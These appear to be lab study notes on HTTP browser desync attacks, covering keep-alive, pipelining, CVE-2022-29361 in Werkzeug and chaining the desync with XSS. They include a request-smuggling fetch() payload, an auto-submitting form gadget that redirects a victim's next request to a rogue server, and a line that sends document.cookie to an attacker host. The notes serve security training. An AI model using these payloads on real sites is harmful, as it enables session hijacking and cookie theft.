
## HTTP features

- **HTTP Keep-Alive** :
  HTTP keep-alive is a mechanism that allows the reuse of a single TCP connection for multiple HTTP requests and responses. It helps reduce latency and improve performance by avoiding the need to open and close connections repeatedly. However, it can introduce a security risk known as Cache Poisoning. If caching mechanisms are in place, the persistence of connections through keep-alive could contribute to cache poisoning attacks. An attacker might exploit desynchronization issues to store malicious content in caches.
	![](Pasted%20image%2020250215043608.png)

- **HTTP Pipelining**
  Usually, with HTTP, one request results in one response. If the HTTP pipelining is enabled in the backend server, it will allow the simultaneous sending of two requests with the corresponding responses without waiting for each response. The only way to differentiate between two requests and a big one is by using the Content-Length header, which specifies the length in bytes of each request. The content header is an unnecessary header for most static file contents in a web application, like images or icons, since the backend server will usually not consider it.
	![](Pasted%20image%2020250215043647.png)


## Browser Desync
In a Browser Desync attack, the attacker aims to take control of a victim's account by exploiting vulnerabilities in a web application's user connection system.
	![](Pasted%20image%2020250215043909.png)

This attack occurs in two steps:

1.  The initial request, appearing legitimate, is intended to disrupt the user request queue by introducing an arbitrary request. 
2. Once the connection pool is compromised, the very next valid request will be replaced by the arbitrary request initiated in the previous step.

Take a look at this high-level representation of the attack:
	![](Pasted%20image%2020250215045837.png)

In the diagram above, the client initiates a POST request utilizing the keep-alive feature, ensuring the connection remains persistent. This persistence allows for transmitting multiple requests within the same session. This POST request contains a hijack GET request within its body. If the web server is vulnerable, it mishandles the request body, leaving this hijack request in the connection queue. Next, when the client makes another request, the hijack GET request is added at the forefront, replacing the expected behavior.


###  Browser Desync Identification
For a better understanding of HTTP Browser Desynchronization, we will use a web application vulnerable to [CVE-2022-29361](https://nvd.nist.gov/vuln/detail/cve-2022-29361). The web app will serve a single route.

```python
from flask import Flask  

app = Flask(__name__) @app.route("/", methods=["GET", "POST"])
def index(): 
	return """ CVE-2022-29361 Welcome to the Vulnerable Web Application """ 

if __name__ == "__main__": 
	app.run("0.0.0.0", 5000)
```

The web server impacted by this CVE is running Werkzeug v2.1.0, a versatile WSGI web application library. The crucial update in commit  [4795b9a7](https://github.com/pallets/werkzeug/commit/4795b9a7) **allows keep-alive connections when threaded or process options are configured.**
	![](Pasted%20image%2020250215050438.png)

To execute the attack, a straightforward approach is to utilize the `fetch` JavaScript function. This function allows for maintaining the connection ID across requests. 

The connection ID refers to a unique identifier assigned to a network connection between the client (browser) and the server. This identifier helps the server keep track of multiple connections and distinguish between them. This consistent connection ID lies in its ability to facilitate exploitation for an attacker that could expose user information or session tokens such as cookies.

Moreover, in a cross-site attack, the browser shares user cookies based on how the `SameSite` flag is set (CORS), but this security rule doesn't apply if the current domain matches the remote one, as in Browser Desync attacks. In such cases, there's no restriction. 

You can hack your session by using the following payload from your browser command line.

```javascript
fetch('http://MACHINE_IP:5000/', {

    method: 'POST',
    body: 'GET /redirect HTTP/1.1\r\nFoo: x',
    mode: 'cors',

})
```

1. `http://MACHINE_IP:5000/`  
    This is the URL to which the HTTP request is made for the vulnerable server. In this case, it's the registration endpoint on the local server.
    
2. `{ method: 'POST' }`
	The `method` parameter specifies the HTTP method for the request. Here, it's set to 'POST'.

3. `{ body: 'GET /redirect HTTP/1.1\r\nFoo: x' }`
	In the body, there is the second request that is going to be injected into the queue.
	
4. `{ mode: 'cors' }`

The vulnerable website will be running at the port 5000. Furthermore, this implies that an attacker can obtain complete control over a victim's browser when the specified payload is executed from the victim.

The following screenshots will show an example of the attack using the previous payload.
	![](Pasted%20image%2020250215051000.png)

The desync attack involves injecting an arbitrary request into the request HTTP queue. Upon refreshing the page, it redirects to the /redirect endpoint, leading to a 404 error page display since that route is not present.
	![](Pasted%20image%2020250215051036.png)

### XSS Chaining
Based on the considerations outlined in previous tasks, one potential attack vector involves replacing the following request with an arbitrary JavaScript file to execute custom code.

**Note:**
	This strategy necessitates the presence of an arbitrary file upload feature on the website.

Instead, we can use a rogue server to deliver an XSS attack to steal the cookie from the victim. We can use the following gadget and deliver it to abuse any component of the web application that allows to reflect text and probably be visited by a user:

```html
<form id="btn" action="http://challenge.thm/"
    method="POST"
    enctype="text/plain">
<textarea name="GET http://YOUR_IP HTTP/1.1
AAA: A">placeholder1</textarea>
<button type="submit">placeholder2</button>
</form>
<script> btn.submit() </script>
```

We utilize a form because it inherently supports a keep-alive connection by default. The type is used to avoid the default encoding MIME type since we don't want to encode the second malicious request. Furthermore, the textarea's name attribute will overwrite the bytes of the following request, enabling redirection to our rogue server.  

To summarize, this gadget operates by using the initial request to position the victim within the connection context of the vulnerable server. The following request retrieves the malicious payload, compromising the victim's session.

To do so, we can set up a rogue server by serving a route with a malicious payload like: `fetch('http://YOUR_IP/' + document.cookie);`
